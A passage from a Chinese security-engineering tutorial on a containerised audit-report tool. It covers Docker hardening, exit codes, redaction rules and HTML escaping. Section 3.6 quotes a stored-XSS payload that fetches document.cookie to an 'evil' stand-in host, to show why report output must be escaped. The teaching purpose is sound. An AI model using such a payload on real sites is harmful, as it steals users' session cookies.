+<div class="codeblock"><div class="cb-head"><span class="cb-lang">dockerfile</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="k">ENTRYPOINT</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;python&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;03-toolbox-cli.py&quot;</span><span class="p">]</span><span class="w">        </span>#<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>形式（正确）
+<span class="c"># ENTRYPOINT python 03-toolbox-cli.py             # shell 形式（错误）</span>
+</code></pre></div>
+<p>shell 形式的实际效果是 <code>/bin/sh -c "python 03-toolbox-cli.py"</code>：<br>
+- <strong>PID 1 变成了 <code>sh</code></strong>，它不转发信号。<br>
+<code>docker stop</code> 发的 SIGTERM 会被忽略，容器只能等 10 秒超时被 SIGKILL。<br>
+- <strong>退出码链路多一环</strong>，某些情况下 sh 会掩盖子进程的退出码。</p>
+<p>对我们的工具来说，第二条是致命的：<strong>整个门禁机制建立在退出码上</strong>。<br>
+所以这里必须用 exec 形式。实测（见第 6 节）容器里<br>
+<code>--fail-on high</code> 正确返回 <code>1</code>、写盘失败正确返回 <code>3</code>。</p>
+<p>如果想要更强的 PID 1 语义（回收僵尸进程 + 完整信号转发），<br>
+可以在镜像里加 <code>tini</code> 或 <code>dumb-init</code> 并作为 ENTRYPOINT。<br>
+本课程序是单进程短任务（跑完就退），所以直接 exec 就够，<br>
+但生产上的<strong>长驻</strong>容器应该加。</p>
+<h3 id="36-html-xss">3.6 HTML 渲染必须转义（否则审计工具变成 XSS 载体）</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">python</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="n">ev</span> <span class="o">=</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">_html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="n">f</span><span class="p">[</span><span class="s2">&quot;evidence&quot;</span><span class="p">])</span>
+</code></pre></div>
+<p>为什么这事特别严重？因为 <code>evidence</code> 字段的来源是<strong>被审计目标</strong>。<br>
+被审计目标可能是攻击者控制的页面/响应。设想：</p>
+<pre class="plain"><code>目标响应里包含：&lt;script&gt;fetch(&#x27;http://evil/&#x27;+document.cookie)&lt;/script&gt;
+    ↓
+我们用字符串拼接把它写进报告 HTML
+    ↓
+负责人在浏览器打开报告 → 脚本在自己公司域内执行
+    ↓
+审计工具成功地把攻击载荷投递给了审计员
+</code></pre>
+<p>这是<strong>真实存在过</strong>的漏洞类别（存储型 XSS 通过日志/报告界面触发）。<br>
+防法就是一句 <code>html.escape()</code>——但你必须<strong>在每个出口都记得</strong>。<br>
+本课还把这条写成了思考题（见第 8 节第 3 题）。</p>
+<h3 id="37">3.7 多阶段构建省掉了什么（实测数据）</h3>
+<pre class="plain"><code>python:3.12-slim 基础镜像         179 MB
+我们的运行镜像 audit-toolbox:1.0  194 MB   ← 只加了约 15 MB
+</code></pre>
+<p>15 MB 里包含：从 builder 拷来的 venv、两个 py 文件、一个 <code>/out</code> 挂载点声明。<br>
+<strong>没有</strong>包含：pip 的下载缓存、编译工具链、headless 构建中间层。</p>
+<p>如果只写单阶段（把 <code>pip install</code> 和运行放同一个 stage），<br>
+缓存和构建残留会一并留在最终镜像里。在依赖多的项目里，<br>
+这个差距常见是 300MB ~ 1GB 级别。</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">dockerfile</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="k">COPY</span><span class="w"> </span>requirements.txt<span class="w"> </span>./<span class="w">          </span>#<span class="w"> </span>只拷依赖清单
+<span class="k">RUN</span><span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt
+<span class="k">COPY</span><span class="w"> </span>report_core.py<span class="w"> </span><span class="m">03</span>-toolbox-cli.py<span class="w"> </span>/app/<span class="w">    </span>#<span class="w"> </span>代码另拷
+</code></pre></div>
+<p>这个顺序也是刻意的：<strong>依赖变动频率低于代码</strong>，<br>
+分开拷贝能让"只改代码"的重建命中依赖层缓存，构建从几十秒降到一两秒。</p>
+<h3 id="38-root-eacces">3.8 非 root + 绑定挂载 = EACCES（本课实测撞到的坑）</h3>
+<p>这是本课最有价值的一次"翻车"实测，完整记录如下。</p>
+<p><strong>现象</strong>：镜像构建成功、容器能启动、报告渲染正常，但写盘失败：</p>
+<pre class="plain"><code>📄 报告：安全审计报告
+   摘要　：findings=7 critical=1 high=3 …
+   时间戳：2026-09-24T06:00:00+08:00
+❌ 写盘失败：[Errno 13] Permission denied: &#x27;/out/day165-docker.md&#x27;
+exit=3
+</code></pre>
+<p><strong>原因</strong>：容器里跑的是 <code>uid=10001(app)</code>，而宿主上绑定的目录 <code>out/</code><br>
+属于 <code>root:root</code> 且权限是 <code>755</code>。<code>10001</code> 在里面<strong>没有写权限</strong>。</p>
+<p><strong>注意这里暴露了一个好设计</strong>：程序没有崩，没有抛异常堆栈，<br>
+而是输出了一条人类可读的错误并返回<strong>退出码 3</strong>。<br>
+门禁系统能立刻区分"渲染失败"和"有高危发现"。</p>
+<p><strong>三种修法</strong>（按推荐度排序）：</p>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="c1"># 修法 A（推荐 · 最明确）：给宿主输出目录正确属主</span>
+mkdir<span class="w"> </span>-p<span class="w"> </span>out<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>chown<span class="w"> </span><span class="m">10001</span>:10001<span class="w"> </span>out
+docker<span class="w"> </span>run<span class="w"> </span>…<span class="w"> </span>-v<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PWD</span><span class="s2">/out:/out&quot;</span><span class="w"> </span>…
+
+<span class="c1"># 修法 B（临时/调试）：用宿主当前用户覆盖镜像内用户</span>
+docker<span class="w"> </span>run<span class="w"> </span>--user<span class="w"> </span><span class="s2">&quot;</span><span class="k">$(</span>id<span class="w"> </span>-u<span class="k">)</span><span class="s2">:</span><span class="k">$(</span>id<span class="w"> </span>-g<span class="k">)</span><span class="s2">&quot;</span><span class="w"> </span>…
+
+<span class="c1"># 修法 C（生产 · 更干净）：用命名卷，不绑宿主目录</span>
+docker<span class="w"> </span>run<span class="w"> </span>-v<span class="w"> </span>audit-out:/out<span class="w"> </span>…<span class="w">      </span><span class="c1"># docker volume create audit-out</span>
+</code></pre></div>
+<p><strong>为什么不推荐"把容器改成 root"</strong>？因为那是在用整个沙箱换一个目录权限，<br>
+是典型的本末倒置。实测中修法 A 一次通过，四个格式全部写出：</p>
+<pre class="plain"><code>✅ 已写入 /out/day165-docker.md（4431 字节）
+✅ 已写入 /out/day165-docker.json（5317 字节）
+✅ 已写入 /out/day165-docker.html（5531 字节）
+✅ 已写入 /out/day165-docker.sarif（10371 字节）
+exit=0
+</code></pre>
+<p><strong>延伸经验</strong>：这类"权限"问题在 CI 里会表现成"本地能跑、流水线挂"。<br>
+定位手段就一句：<code>docker run --rm &lt;image&gt; id</code> 看容器里的 uid，<br>
+再 <code>ls -ld &lt;host_dir&gt;</code> 看宿主的属主，两边一比答案自现。</p>
+<h3 id="39">3.9 资源上限：为什么文本处理程序也要限内存</h3>
+<p>有人认为"我只是读 JSON 写文本，不需要限制"。这句话在<strong>输入可信</strong>时成立。</p>
+<p>但审计工具的输入往往来自外部（扫描结果、客户提供的日志）。<br>
+<strong>当攻击者能控制输入大小时，他就部分控制了你进程的资源消耗。</strong></p>
+<p>几个具体的放大点：<br>
+- <code>json.loads</code> 会把整个文档建成对象图，200MB JSON 可能膨胀到 1~2GB 内存<br>
+- <code>Report.ordered_findings()</code> 会为每条 finding 算一次哈希与排序键<br>
+- HTML 渲染会为整份报告在内存里拼一个大字符串</p>
+<p>所以 compose 里给了 <code>memory: 256M</code> / <code>cpus: "1.0"</code>。<br>
+这不是"性能优化"，是<strong>失效边界的定义</strong>：<br>
+超出就干净地死掉，而不是把宿主一起拖垮。</p>
+<hr>
+<h2 id="4">4. 图解</h2>
+<p>完整图解见 <a href="diagrams/README.md"><code>diagrams/README.md</code></a>（6 张图：渲染管线、确定性杀手、<br>
+退出码决策树、容器信任边界、EACCES 排查路径、格式信息损失地图）。</p>
+<p>这里放两张最该记住的：</p>
+<h3 id="41">4.1 渲染管线（数据流单向）</h3>
+<pre class="plain"><code>  收集（三个面）      归一化（唯一算数的地方）      渲染（零计算）
+ ┌─────────────┐     ┌────────────────────┐     ┌────────────────┐
+ │ 资产 / 漏洞  │ ──► │ 去重 → 排序 → 计数  │ ──► │ JSON / MD /    │
+ │ / 流量      │     │ → 脱敏（幂等）      │     │ HTML / SARIF   │
+ └─────────────┘     └─────────┬──────────┘     └───────┬────────┘
+                               ▼                        ▼
+                      中间表示 model()            退出码 0/1/2/3/4
+</code></pre>
+<h3 id="42-mermaid">4.2 确定性（Mermaid）</h3>
+<div class="mermaid-wrap"><div class="mermaid">flowchart LR
+    A[原始观测] --&gt; B[时间戳外部注入]
+    B --&gt; C[统一排序&lt;br/&gt;severity/risk/target/rule_id]
+    C --&gt; D[内容哈希 id]
+    D --&gt; E[字节确定的报告]
+    E --&gt; F[可 diff]
+    E --&gt; G[产物哈希可信]
+    E --&gt; H[回归对比无噪声]
+</div><button class="mermaid-raw" type="button" onclick="this.parentNode.classList.toggle('show-raw')">查看源码</button><pre class="mermaid-src"><code>flowchart LR
+    A[原始观测] --&gt; B[时间戳外部注入]
+    B --&gt; C[统一排序&lt;br/&gt;severity/risk/target/rule_id]
+    C --&gt; D[内容哈希 id]
+    D --&gt; E[字节确定的报告]
+    E --&gt; F[可 diff]
+    E --&gt; G[产物哈希可信]
+    E --&gt; H[回归对比无噪声]
+</code></pre></div>
+<hr>
+<h2 id="5-api">5. 定义与使用方法（API 速查表）</h2>
+<h3 id="51-finding">5.1 <code>Finding</code> 字段</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">字段</th>
+<th style="text-align: left;">类型</th>
+<th style="text-align: center;">必填</th>
+<th style="text-align: left;">说明</th>
+<th style="text-align: left;">为什么需要它</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>rule_id</code></td>
+<td style="text-align: left;">str</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: left;">规则标识（如 <code>WEB-SQLI-ERROR</code>）</td>
+<td style="text-align: left;">机器聚合的键；也是 id 的一部分</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>title</code></td>
+<td style="text-align: left;">str</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: left;">人类可读的一句话</td>
+<td style="text-align: left;">报告标题行；<strong>不</strong>参与 id</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>severity</code></td>
+<td style="text-align: left;">str</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: left;"><code>critical/high/medium/low/info</code></td>
+<td style="text-align: left;">排序第一维；非法值直接报错</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>target</code></td>
+<td style="text-align: left;">str</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: left;">受影响对象（URL / host:port / 流程名）</td>
+<td style="text-align: left;">修复者定位用；id 的主键</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>reason</code></td>
+<td style="text-align: left;">str</td>
+<td style="text-align: center;">✅</td>
+<td style="text-align: left;"><strong>为什么会命中</strong>（事实+推断）</td>
+<td style="text-align: left;">让读者能自己判断是否认可</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>remediation</code></td>
+<td style="text-align: left;">str</td>
+<td style="text-align: center;">—</td>
+<td style="text-align: left;">修复建议</td>
+<td style="text-align: left;">与 reason 分开，避免事实/推断混淆</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>confidence</code></td>
+<td style="text-align: left;">str</td>
+<td style="text-align: center;">—</td>
+<td style="text-align: left;"><code>high/medium/low</code>（默认 high）</td>
+<td style="text-align: left;">参与风险分，不改变 severity</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>evidence</code></td>
+<td style="text-align: left;">tuple[str]</td>
+<td style="text-align: center;">—</td>
+<td style="text-align: left;">证据切片（可空）</td>
+<td style="text-align: left;">空时必须渲染成"（无证据，属建议项）"</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>tags</code></td>
+<td style="text-align: left;">tuple[str]</td>
+<td style="text-align: center;">—</td>
+<td style="text-align: left;">自由标签</td>
+<td style="text-align: left;">后续聚类/过滤</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>phase</code></td>
+<td style="text-align: left;">str</td>
+<td style="text-align: center;">—</td>
+<td style="text-align: left;">来自哪一天/哪一层</td>
+<td style="text-align: left;">阶段项目里追溯发现层</td>
+</tr>
+</tbody>
+</table>
+<p>派生属性（只读）：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">属性</th>
+<th style="text-align: left;">计算</th>
+<th style="text-align: left;">用途</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>id</code></td>
+<td style="text-align: left;"><code>stable_id(target, rule_id, severity)[:12]</code></td>
+<td style="text-align: left;">去重键、diff 集合运算的键</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>risk</code></td>
+<td style="text-align: left;"><code>权重[severity] × 系数[confidence]</code></td>
+<td style="text-align: left;">同严重度内的排序、风险总分</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>sort_key</code></td>
+<td style="text-align: left;"><code>(sev序, -risk, target, rule_id)</code></td>
+<td style="text-align: left;"><strong>唯一</strong>排序依据</td>
+</tr>
+</tbody>
+</table>
+<p>严重度权重表：<code>critical 40 · high 25 · medium 12 · low 5 · info 1</code><br>
+置信度系数表：<code>high ×1.0 · medium ×0.6 · low ×0.3</code></p>
+<h3 id="52-report">5.2 <code>Report</code> 方法</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">方法</th>
+<th style="text-align: left;">签名</th>
+<th style="text-align: left;">返回</th>
+<th style="text-align: left;">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>add</code></td>
+<td style="text-align: left;"><code>(Finding) -&gt; Report</code></td>
+<td style="text-align: left;">self</td>
+<td style="text-align: left;">链式添加</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>extend</code></td>
+<td style="text-align: left;"><code>(Iterable[Finding]) -&gt; Report</code></td>
+<td style="text-align: left;">self</td>
+<td style="text-align: left;">批量添加</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>ordered_findings</code></td>
+<td style="text-align: left;"><code>() -&gt; list[Finding]</code></td>
+<td style="text-align: left;">去重+排序后的列表</td>
+<td style="text-align: left;"><strong>每次调用都重算</strong>，不改内部状态</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>counts</code></td>
+<td style="text-align: left;"><code>() -&gt; dict[str,int]</code></td>
+<td style="text-align: left;">五档计数（含 0）</td>
+<td style="text-align: left;">表格形状稳定</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>total_risk</code></td>
+<td style="text-align: left;"><code>() -&gt; int</code></td>
+<td style="text-align: left;">风险总分</td>
+<td style="text-align: left;">报告头展示</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>model</code></td>
+<td style="text-align: left;"><code>() -&gt; dict</code></td>
+<td style="text-align: left;">与格式无关的 IR</td>
+<td style="text-align: left;">唯一数据源</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>render_json</code></td>
+<td style="text-align: left;"><code>(indent=2) -&gt; str</code></td>
+<td style="text-align: left;">JSON 文本</td>
+<td style="text-align: left;">机器消费者</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>render_markdown</code></td>
+<td style="text-align: left;"><code>() -&gt; str</code></td>
+<td style="text-align: left;">Markdown 文本</td>
+<td style="text-align: left;">人类消费者</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>render_html</code></td>
+<td style="text-align: left;"><code>() -&gt; str</code></td>
+<td style="text-align: left;">HTML（已转义）</td>
+<td style="text-align: left;">汇报用</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>render_sarif</code></td>
+<td style="text-align: left;"><code>() -&gt; str</code></td>
+<td style="text-align: left;">SARIF 2.1.0</td>
+<td style="text-align: left;">CI/IDE</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>summarize</code></td>
+<td style="text-align: left;">模块级函数</td>
+<td style="text-align: left;">单行摘要</td>
+<td style="text-align: left;">CLI/日志</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>⚠️ <code>ordered_findings()</code> 每次调用都重新计算。<br>
+为什么不做缓存？因为 <code>Report</code> 是<strong>可变</strong>的（<code>add</code> 会改它），<br>
+缓存就要处理失效问题——而这点计算量完全不值得引入失效逻辑。<br>
+换来的好处是：任何时刻调用都反映最新状态，不会有"忘了刷新"的隐性 bug。</p>
+</blockquote>
+<h3 id="53-cli-03-toolbox-clipy">5.3 CLI 参数（<code>03-toolbox-cli.py</code>）</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">参数</th>
+<th style="text-align: left;">取值</th>
+<th style="text-align: left;">默认</th>
+<th style="text-align: left;">说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>--input</code> / <code>-i</code></td>
+<td style="text-align: left;">路径</td>
+<td style="text-align: left;">必填</td>
+<td style="text-align: left;">findings JSON（数组或带 <code>findings</code> 的对象）</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>--format</code> / <code>-f</code></td>
+<td style="text-align: left;"><code>md\|json\|html\|sarif\|all</code></td>
+<td style="text-align: left;"><code>md</code></td>
+<td style="text-align: left;"><code>all</code> = 四种全出</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>--out-dir</code> / <code>-o</code></td>
+<td style="text-align: left;">目录</td>
+<td style="text-align: left;"><code>./out</code></td>
+<td style="text-align: left;">输出目录（自动创建）</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>--stem</code></td>
+<td style="text-align: left;">文件名主干</td>
+<td style="text-align: left;"><code>day165-report</code></td>
+<td style="text-align: left;">输出文件名前缀</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>--title</code></td>
+<td style="text-align: left;">文本</td>
+<td style="text-align: left;"><code>安全审计报告</code></td>
+<td style="text-align: left;">报告标题</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>--fail-on</code></td>
+<td style="text-align: left;">严重度 或 <code>""</code></td>
+<td style="text-align: left;">无</td>
+<td style="text-align: left;">达到或<strong>超过</strong>即退出码 1</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>--allow-coverage-gaps</code></td>
+<td style="text-align: left;">开关</td>
+<td style="text-align: left;">关</td>
+<td style="text-align: left;">有缺口也返回 0（不推荐）</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>--generated-at</code></td>
+<td style="text-align: left;">ISO-8601</td>
+<td style="text-align: left;"><code>SOURCE_DATE_EPOCH</code> 或当前时间</td>
+<td style="text-align: left;">固定时间戳做可复现产物</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>--summary-only</code></td>
+<td style="text-align: left;">开关</td>
+<td style="text-align: left;">关</td>
+<td style="text-align: left;">只打印摘要，不写文件</td>
+</tr>
+</tbody>
+</table>
+<h3 id="54">5.4 退出码契约</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">码</th>
+<th style="text-align: left;">含义</th>
+<th style="text-align: left;">行动项</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">0</td>
+<td style="text-align: left;">通过</td>
+<td style="text-align: left;">无需动作</td>
+</tr>
+<tr>
+<td style="text-align: center;">1</td>
+<td style="text-align: left;">有达到/超过阈值的发现</td>
+<td style="text-align: left;">去修</td>
+</tr>
+<tr>
+<td style="text-align: center;">2</td>
+<td style="text-align: left;">输入/用法错误</td>
+<td style="text-align: left;">改调用方式或修数据</td>
+</tr>
+<tr>
+<td style="text-align: center;">3</td>
+<td style="text-align: left;">渲染或写盘失败</td>
+<td style="text-align: left;">查磁盘/权限（本课实测撞到过）</td>
+</tr>
+<tr>
+<td style="text-align: center;">4</td>
+<td style="text-align: left;">存在覆盖缺口</td>
+<td style="text-align: left;">补测，或<strong>显式接受盲区</strong></td>
+</tr>
+</tbody>
+</table>
+<h3 id="55">5.5 常用命令速查</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="c1"># 本地：四种格式全出（时间戳固定，产物可复现）</span>
+<span class="nb">cd</span><span class="w"> </span>code
+python3<span class="w"> </span><span class="m">03</span>-toolbox-cli.py<span class="w"> </span>--input<span class="w"> </span>findings.example.json<span class="w"> </span>--format<span class="w"> </span>all<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--generated-at<span class="w"> </span><span class="m">2026</span>-09-24T06:00:00+08:00<span class="w"> </span>--allow-coverage-gaps
+
+<span class="c1"># 本地：高危即拦截（CI 门禁形态）</span>
+python3<span class="w"> </span><span class="m">03</span>-toolbox-cli.py<span class="w"> </span>-i<span class="w"> </span>findings.example.json<span class="w"> </span>-f<span class="w"> </span>md<span class="w"> </span>--fail-on<span class="w"> </span>high<span class="w"> </span>--summary-only
+
+<span class="c1"># 可复现构建的时间戳来源</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">SOURCE_DATE_EPOCH</span><span class="o">=</span><span class="m">1758664800</span>
+
+<span class="c1"># Docker：构建</span>
+docker<span class="w"> </span>build<span class="w"> </span>-t<span class="w"> </span>audit-toolbox:1.0<span class="w"> </span>.
+
+<span class="c1"># Docker：最保守地跑（无网络 / 只读根 / 无能力）</span>
+docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>--network<span class="w"> </span>none<span class="w"> </span>--read-only<span class="w"> </span>--tmpfs<span class="w"> </span>/tmp:size<span class="o">=</span>16m<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--cap-drop<span class="w"> </span>ALL<span class="w"> </span>--security-opt<span class="w"> </span>no-new-privileges<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-v<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PWD</span><span class="s2">/findings.example.json:/data/findings.json:ro&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>-v<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PWD</span><span class="s2">/out:/out&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>audit-toolbox:1.0<span class="w"> </span>--input<span class="w"> </span>/data/findings.json<span class="w"> </span>--format<span class="w"> </span>all<span class="w"> </span>--out-dir<span class="w"> </span>/out
+
+<span class="c1"># Docker：看容器里到底是谁在跑（排查权限问题的第一句）</span>
+docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>--entrypoint<span class="w"> </span>id<span class="w"> </span>audit-toolbox:1.0
+
+<span class="c1"># Docker Compose</span>
+docker<span class="w"> </span>compose<span class="w"> </span>build
+docker<span class="w"> </span>compose<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>report<span class="w"> </span>--input<span class="w"> </span>/data/findings.json<span class="w"> </span>--format<span class="w"> </span>all
+docker<span class="w"> </span>compose<span class="w"> </span>--profile<span class="w"> </span>gate<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>gate
+</code></pre></div>
+<h3 id="56-report_core_redact_patterns">5.6 脱敏规则表（<code>report_core._REDACT_PATTERNS</code>）</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">顺序</th>
+<th style="text-align: left;">匹配</th>
+<th style="text-align: left;">替换为</th>
+<th style="text-align: left;">为什么这么写</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">1</td>
+<td style="text-align: left;"><code>Authorization/Proxy-Authorization/Cookie/Set-Cookie: &lt;值&gt;</code></td>
+<td style="text-align: left;"><code>\1: &lt;REDACTED&gt;</code></td>
+<td style="text-align: left;"><strong>吃到行尾</strong>，否则只擦掉第一个词（实测踩坑）</td>
+</tr>
+<tr>
+<td style="text-align: center;">2</td>
+<td style="text-align: left;"><code>Bearer &lt;token&gt;</code></td>
+<td style="text-align: left;"><code>Bearer &lt;REDACTED&gt;</code></td>
+<td style="text-align: left;">兜底独立出现的令牌</td>
+</tr>
+<tr>
+<td style="text-align: center;">3</td>
+<td style="text-align: left;"><code>password/passwd/pwd/secret/token/api_key = &lt;值&gt;</code></td>
+<td style="text-align: left;"><code>&lt;REDACTED&gt;</code></td>
+<td style="text-align: left;">值里排除 <code>,;&amp;"'</code>，避免互相吞并</td>
+</tr>
+<tr>
+<td style="text-align: center;">4</td>
+<td style="text-align: left;"><code>scheme://user:pass@host</code></td>
+<td style="text-align: left;"><code>scheme://&lt;REDACTED&gt;:&lt;REDACTED&gt;@host</code></td>
+<td style="text-align: left;">URL 内嵌凭证</td>
+</tr>
+</tbody>
+</table>
+<p>写自定义规则时的三条铁律：</p>
+<ol>
+<li><strong>先指纹后擦除</strong>（否则检测能力被自己抹掉，甚至产生误报，见 02 号实验）</li>
+<li><strong>保证幂等</strong>（<code>f(f(x)) == f(x)</code>），否则多层渲染会反复擦</li>
+<li><strong>在真数据上跑一遍</strong>，看有没有"只擦一半"的情况（<code>\S+</code> 这个坑很常见）</li>
+</ol>
+<hr>
+<h2 id="6">6. 实战代码案例</h2>
+<p>四天项目的收口场景：<strong>把前三天的发现汇成一份可交付报告，并钉进容器里跑。</strong></p>
+<h3 id="61">6.1 文件清单</h3>
+<table>
+<thead>
+<tr>
+<th style="text-align: left;">文件</th>
+<th style="text-align: center;">行数量级</th>
+<th style="text-align: left;">作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: left;"><code>code/report_core.py</code></td>
+<td style="text-align: center;">~560</td>
+<td style="text-align: left;">数据模型 + 四种渲染器 + 脱敏（<strong>核心库</strong>）</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>code/01-basic-report.py</code></td>
+<td style="text-align: center;">~150</td>
+<td style="text-align: left;">基础用法：收集 → 组装 → 渲染 Markdown/JSON</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>code/02-determinism-redaction.py</code></td>
+<td style="text-align: center;">~250</td>
+<td style="text-align: left;">进阶：确定性验证、脱敏顺序、幂等坑</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>code/03-toolbox-cli.py</code></td>
+<td style="text-align: center;">~300</td>
+<td style="text-align: left;">实战：CLI + 四种格式 + 退出码门禁</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>code/findings.example.json</code></td>
+<td style="text-align: center;">—</td>
+<td style="text-align: left;">合成输入（来自 Day 162/163/164 三个面）</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>code/Dockerfile</code></td>
+<td style="text-align: center;">—</td>
+<td style="text-align: left;">多阶段构建 + 非 root + exec ENTRYPOINT</td>
+</tr>
+<tr>
+<td style="text-align: left;"><code>code/docker-compose.yml</code></td>
+<td style="text-align: center;">—</td>
+<td style="text-align: left;">加固编排（无网络/只读/cap_drop/限额）</td>
+</tr>
+</tbody>
+</table>
+<h3 id="62-a">6.2 场景 A：本地出报告（最常用）</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl"><span class="nb">cd</span><span class="w"> </span>code
+python3<span class="w"> </span><span class="m">03</span>-toolbox-cli.py<span class="w"> </span>--input<span class="w"> </span>findings.example.json<span class="w"> </span>--format<span class="w"> </span>all<span class="w"> </span><span class="se">\</span>
+<span class="w">    </span>--generated-at<span class="w"> </span><span class="m">2026</span>-09-24T06:00:00+08:00<span class="w"> </span>--allow-coverage-gaps
+</code></pre></div>
+<p>实测输出：</p>
+<pre class="plain"><code>📄 报告：安全审计报告
+   范围　：127.0.0.1 自建靶场（非真实目标；授权演练）
+   摘要　：findings=7 critical=1 high=3 medium=1 low=1 info=1 risk=105 gaps=4
+   时间戳：2026-09-24T06:00:00+08:00
+   ✅ 已写入 .../out/day165-report.md（4431 字节）
+   ✅ 已写入 .../out/day165-report.json（5317 字节）
+   ✅ 已写入 .../out/day165-report.html（5531 字节）
+   ✅ 已写入 .../out/day165-report.sarif（10371 字节）
+✅ 通过
+exit=0
+</code></pre>
+<p><strong>读一下这几行数字里的信息</strong>：<br>
+- 7 条发现、风险总分 105；<br>
+- critical 1 + high 3 = 4 条在 <code>--fail-on high</code> 的拦截范围内（下个场景验证）；<br>
+- <strong>gaps=4</strong>，说明这份报告有四块"未覆盖区域"。<br>
+  四块缺口真的很多吗？不是——它恰好是<strong>诚实度</strong>的体现（TLS 不可见、无授权账号、无 IPv6、代理超时丢包）。<br>
+- 四种格式体积差很大（4.4KB vs 10.4KB），SARIF 最大因为它要把规则、位置、指纹重复表达一遍。</p>
+<h3 id="63-bci">6.3 场景 B：CI 门禁</h3>
+<div class="codeblock"><div class="cb-head"><span class="cb-lang">bash</span><button class="copy" type="button" onclick="copyCode(this)">复制</button></div><pre class="hl-pre"><code class="hl">python3<span class="w"> </span><span class="m">03</span>-toolbox-cli.py<span class="w"> </span>-i<span class="w"> </span>findings.example.json<span class="w"> </span>-f<span class="w"> </span>md<span class="w"> </span>--fail-on<span class="w"> </span>high<span class="w"> </span>--summary-only
+</code></pre></div>
